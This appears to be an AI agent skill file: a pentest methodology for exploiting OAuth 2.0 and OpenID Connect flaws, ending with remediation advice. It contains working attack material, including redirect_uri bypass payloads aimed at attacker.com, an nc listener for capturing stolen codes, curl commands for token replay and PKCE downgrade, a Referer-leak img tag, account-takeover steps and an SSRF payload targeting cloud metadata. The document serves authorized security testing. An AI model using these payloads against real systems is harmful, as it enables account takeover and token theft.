---
name: oauth
description: Detect and exploit OAuth 2.0 and OpenID Connect flaws including redirect_uri validation bypasses, state CSRF and pre-account takeover, implicit flow token leakage, PKCE downgrade, code replay, scope escalation, and unverified email claim takeover.
---

# OAuth 2.0 & OpenID Connect Exploitation

## When to use this skill

Use when the target implements OAuth 2.0 or OIDC: "Login with X" buttons, `authorize`/`token` endpoints, JWT `id_token` handling, social login, API delegation, or SSO. Applies to both the OAuth provider (IdP) and the client/relying party (RP). Test only against systems you are authorized to assess; use attacker-controlled accounts and your own redirect endpoints for verification.

## Methodology

### 1. Recon: Discover Endpoints and Supported Flows

Locate the discovery document and enumerate the grant types the provider supports. `response_types` and `grant_types` tell you which attack surfaces exist (implicit → token leakage; code without PKCE → interception/replay).

```bash
curl -s https://target.com/.well-known/openid-configuration | jq .
# Key fields: authorization_endpoint, token_endpoint, jwks_uri,
# response_types_supported, grant_types_supported, code_challenge_methods,
# scopes_supported, id_token_signing_alg_values_supported, issuer
```

Trigger the login flow and capture the full authorization request:

```
GET /authorize?client_id=CLIENT&redirect_uri=https://app.com/cb
  &response_type=code&scope=openid%20profile%20email&state=abc123 HTTP/1.1
Host: idp.target.com
```

Note: `response_type=code` (auth code flow), `token`/`id_token`/`id_token token` (implicit flow), whether `state` is present, whether `code_challenge` (PKCE) is sent, and whether `redirect_uri` is pre-registered or user-supplied. Also fetch the client's JS bundle — many SPAs hardcode `client_id`, `redirect_uri`, and token validation logic.

### 2. Redirect URI Validation Bypasses

The authorization code is delivered to `redirect_uri`. If validation is loose, redirect the code to an attacker host. Enumerate the registered URIs first (send an invalid one and read the error — some IdPs echo the allowlist). Then try bypass classes:

```
# Weak prefix/regex matching (starts-with or contains checks)
redirect_uri=https://target.com.cb.attacker.com/
redirect_uri=https://attacker.com/target.com
redirect_uri=https://target.com@attacker.com/
redirect_uri=https://target.com.attacker.com/callback

# Path traversal / sibling path matching (whitelist matches /cb but not subpaths)
redirect_uri=https://target.com/cb/../..//attacker
redirect_uri=https://target.com/cb/../../%2f%2fattacker.com
redirect_uri=https://target.com/cb?next=https://attacker.com   # if /cb is an open redirector

# Open redirect chaining: find any 302 on the allowed redirect_uri domain
redirect_uri=https://target.com/cb?url=https://attacker.com/log
redirect_uri=https://target.com/redirect?to=//attacker.com/log
```

Host a listener to capture the code, then replay the flow with the victim's code:

```bash
nc -lvnp 443   # or: python3 -m http.server 443
# Captured: GET /log?code=AUTHCODE&state=... HTTP/1.1
curl -s "https://idp.target.com/token" -d "grant_type=authorization_code&code=AUTHCODE&redirect_uri=https://target.com/cb&client_id=CLIENT&client_secret=SECRET"
```

### 3. Missing `state` → CSRF / Pre-Account Takeover

If the client does not bind `state` to the victim's browser session, an attacker can pre-stage an authorization code and CSRF the victim into linking it. Classic pre-account takeover: attacker initiates OAuth login at the client, intercepts the `code` from the callback (never exchanging it), then sends the victim the callback URL. The victim's session completes the exchange and links/creates an account bound to the attacker's IdP identity — the attacker then logs in via that IdP into the victim's account.

```bash
# 1. Attacker starts OAuth flow at client, stops before token exchange
curl -s -c jar.txt "https://app.com/login?provider=google" -L -o /dev/null
# 2. Attacker completes IdP login; callback contains the code — save it, do NOT visit it:
#    https://app.com/oauth/callback?code=ATTACKER_CODE&state=...
# 3. Victim (logged in as victim@app.com) is tricked into visiting that same URL
# 4. Client exchanges code, links attacker's Google identity to victim's account
# 5. Attacker logs in with their Google account → lands in victim's account
```

Verify by checking whether the callback accepts a code without a server-side session-bound `state` check, and whether account linking requires password re-authentication.

### 4. Implicit Flow Token Leakage

`response_type=token` or `id_token` puts `access_token`/`id_token` in the URL **fragment**. Fragments are not sent to servers but ARE available to JS and leak via Referer on outbound links, third-party analytics, and iframes.

```
HTTP/1.1 302 Found
Location: https://app.com/cb#access_token=eyJhbGciOi...&token_type=Bearer&expires_in=3600
```

If the callback page loads external resources (scripts, images, links) without a strict Referrer-Policy, the fragment leaks:

```html
<!-- on https://app.com/cb#access_token=SECRET -->
<img src="https://attacker.com/log">
<!-- Referer: https://app.com/cb#access_token=SECRET -->
```

Also test: embedding the callback in an attacker iframe (if no `X-Frame-Options`/`frame-ancestors`) to script the token out, and `prompt=none` silent flows that re-issue tokens without user interaction:

```bash
curl -s -i "https://idp.target.com/authorize?client_id=CLIENT&response_type=id_token&redirect_uri=https://app.com/cb&scope=openid&prompt=none&nonce=xyz"
# If the victim has an active IdP session, this returns 302 with id_token in fragment — no user consent
```

### 5. Code Replay and PKCE Downgrade

Authorization codes are single-use. Test reuse: exchange the code once, then exchange again — a second 200 with tokens means replay is possible (race it in parallel if the IdP invalidates on use).

```bash
for i in 1 2; do curl -s "https://idp.target.com/token" -d "grant_type=authorization_code&code=CODE&redirect_uri=https://app.com/cb&client_id=CLIENT&client_secret=SECRET" | jq -r .access_token; done
```

PKCE downgrade: if the client sends `code_challenge` with method `plain` or the server accepts token requests without `code_verifier`, the code is only protected by the (interceptable) redirect. Send the token request omitting `code_verifier` entirely:

```bash
curl -s "https://idp.target.com/token" \
  -d "grant_type=authorization_code&code=CODE&redirect_uri=https://app.com/cb&client_id=CLIENT" | jq .
# 200 with tokens = PKCE not enforced; code interception becomes full account compromise
```

Also check `code_challenge_method`: if `plain` is allowed, a sniffed URL `code_challenge` yields the verifier.

### 6. Scope Escalation and Token Substitution

Test whether the client validates that the issued token's scopes/audience match what it requested. Request elevated scopes during a flow the client expects to be low-privilege, or substitute an attacker token for a victim token:

```bash
# Request admin scopes the client never asked for
curl -s "https://idp.target.com/authorize?client_id=CLIENT&response_type=code&scope=openid%20admin%20offline_access&redirect_uri=https://app.com/cb&state=x"
# Then check the resulting token's scopes/claims
curl -s https://app.com/api/me -H "Authorization: Bearer $TOKEN" | jq .scope
```

Check `aud` claim validation: a token issued for another client (`aud: other-client`) accepted by the target API means cross-client token confusion. Also test `id_token` signature validation: `alg: none`, HS256 with a public key as HMAC secret, or missing `kid` validation.

### 7. Unverified Email Claim Account Takeover

If the client provisions accounts by the IdP's `email` claim without checking `email_verified`, register at the IdP with the victim's email (some providers allow unverified signup), then log in at the client — you inherit the victim's account.

```bash
# 1. Register at IdP with victim@example.com (no email verification enforced)
# 2. Decode the issued id_token and confirm the unverified claim:
echo "eyJ..." | base64 -d 2>/dev/null | jq .
# {"iss":"https://idp.example","email":"victim@example.com","email_verified":false}
# 3. Client trusts email claim → logs you into victim's pre-existing account
```

Also test: `email` claim manipulation if the IdP allows profile updates pre-token-issuance, and clients that match on email case-insensitively or strip `+suffixes` inconsistently.

### 8. SSRF via redirect_uri and Metadata Endpoints

Some IdPs fetch `redirect_uri` or client metadata (e.g., dynamic client registration, OIDC `request_uri`, JWKS `jwks_uri`) server-side. Point them at internal hosts:

```bash
# Dynamic client registration with internal JWKS; blind SSRF via DNS/HTTP callback
curl -s -X POST "https://idp.target.com/register" -H "Content-Type: application/json" -d '{"redirect_uris":["http://169.254.169.254/latest/meta-data/"],"jwks_uri":"http://169.254.169.254/latest/meta-data/","token_endpoint_auth_method":"private_key_jwt"}'
# Watch for outbound requests from the IdP
```

Also test `request_uri` (RFC 9101) if supported — the IdP fetches the request object from your URL.

### Remediation

- Enforce **exact string match** on `redirect_uri` against pre-registered values; never prefix/regex/contains matching, and reject path traversal or userinfo tricks.
- Require **`state`** (cryptographically random, bound to the browser session) on every authorization request; reject callbacks with missing/mismatched state.
- Mandate **PKCE with S256** for all clients, including confidential ones; reject `plain` and token requests without a valid `code_verifier`.
- Single-use authorization codes with short TTL (≤60s); invalidate the code on first exchange and detect replay.
- **Disable implicit flow** (`response_type=token|id_token`); use auth code + PKCE for SPAs and native apps.
- Set `Referrer-Policy: no-referrer` on callback pages; forbid framing via `X-Frame-Options: DENY` / `frame-ancestors 'none'`.
- Validate `id_token` signature, `iss`, `aud`, `exp`, and `nonce`; require `email_verified: true` before provisioning or linking accounts by email.
- Restrict server-side fetches (JWKS, request_uri, registration metadata) with allowlists; block link-local and internal IP ranges.
- Validate token `aud` and `scope` at the resource server; never trust scopes the client did not request.
